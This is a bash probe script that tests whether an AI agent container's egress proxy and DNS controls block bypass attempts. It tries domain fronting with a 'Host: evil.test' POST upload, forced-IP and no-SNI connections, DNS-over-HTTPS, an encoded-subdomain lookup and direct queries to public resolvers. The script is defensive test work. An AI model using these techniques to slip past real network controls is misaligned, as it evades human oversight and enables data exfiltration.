#!/usr/bin/env bash
# Probes for the proxy-dns prototype, run inside the agent container (no *_PROXY set):
#   docker compose -f compose.yaml -f setups/proxy-observe/compose.yaml -f setups/proxy-enforce/compose.yaml \
#     -f setups/proxy-dns/compose.yaml --profile run run --rm -T agent shell bash -s < setups/proxy-dns/probe.sh
# Harmless: every request goes to the sink stand-ins or is refused; no secrets involved.
set -u
env | grep -i _proxy || echo "no proxy variables set"
resolve() { python3 - "$@" <<'PY'
import socket, sys
for name in sys.argv[1:]:
    for fam, label in ((socket.AF_INET, "A"), (socket.AF_INET6, "AAAA")):
        try:
            ips = sorted({a[4][0] for a in socket.getaddrinfo(name, 443, fam, socket.SOCK_STREAM)})
        except socket.gaierror as e:
            ips = [f"no answer ({e.strerror})"]
        print(f"  {label:4} {name:28} {', '.join(ips)}")
PY
}
code() { curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$@" || true; }
echo "== DNS"
resolve gh-standin.test api.anthropic.com evil.test aGVsbG8gd29ybGQ.gh-standin.test dns.google
echo "== HTTPS with no proxy settings (status; 000 = could not connect)"
echo "  allowed GET  gh-standin.test/repos/s4steve/x        $(code https://gh-standin.test/repos/s4steve/x)"
echo "  plain HTTP   docs.test/pages/...                    $(code http://docs.test/pages/page-image-query/page.html)"
echo "  unlisted     evil.test                              $(code https://evil.test/x)"
echo "  forced IP    evil.test via --resolve to the proxy   $(code --resolve evil.test:443:172.31.0.2 https://evil.test/x)"
echo "  fronted      gh-standin.test with Host: evil.test   $(code -X POST -H 'Host: evil.test' https://gh-standin.test/upload -d x)"
echo "  no SNI       https://172.31.0.2/ (by IP)            $(code -k https://172.31.0.2/)"
echo "  DoH          dns.google via --resolve to the proxy   $(code --resolve dns.google:443:172.31.0.2 'https://dns.google/resolve?name=x.evil.test')"
echo "== Node built-in fetch, no NODE_USE_ENV_PROXY"
node -e 'fetch("https://docs.test/pages/page-image-query/page.html").then(r => console.log("  status", r.status)).catch(e => console.log("  failed", e.cause?.code || e.message))'
echo "== resolvers other than dns-cache"
python3 - <<'PY'
import socket
q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
for ip, port in (("8.8.8.8", 53), ("1.1.1.1", 53), ("172.31.0.2", 53)):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)
    try:
        s.sendto(q, (ip, port)); s.recvfrom(512); r = "ANSWERED"
    except OSError as e:
        r = f"no ({e.__class__.__name__}: {e})"
    print(f"  udp {ip}:{port:<4} {r}")
for ip, port in (("8.8.8.8", 853), ("1.1.1.1", 443)):
    try:
        socket.create_connection((ip, port), 2).close(); r = "CONNECTED"
    except OSError as e:
        r = f"no ({e})"
    print(f"  tcp {ip}:{port:<4} {r}")
PY
